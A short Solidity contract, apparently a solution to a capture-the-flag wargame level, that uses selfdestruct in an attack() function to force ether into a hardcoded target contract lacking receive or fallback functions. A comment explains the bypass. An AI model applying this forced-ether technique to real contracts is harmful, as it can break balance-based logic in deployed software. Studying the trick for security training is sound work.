//SPDX-License-Identifer: MIT
pragma solidity ^0.8.0;

contract Selfdestruct {
    address payable payableAddress =
        payable(0xa063D094e5e573D88928ea310d14ed6DCf14fE63);

    /**
     * With self destruct we can bypass the fact that this force contract has no recieve or fallback function
     * when selfdestruct is called, you can designate an address to send ether to which here is the force contract.
     */
    function attack() external payable {
        selfdestruct(payableAddress);
    }

    receive() external payable {}
}
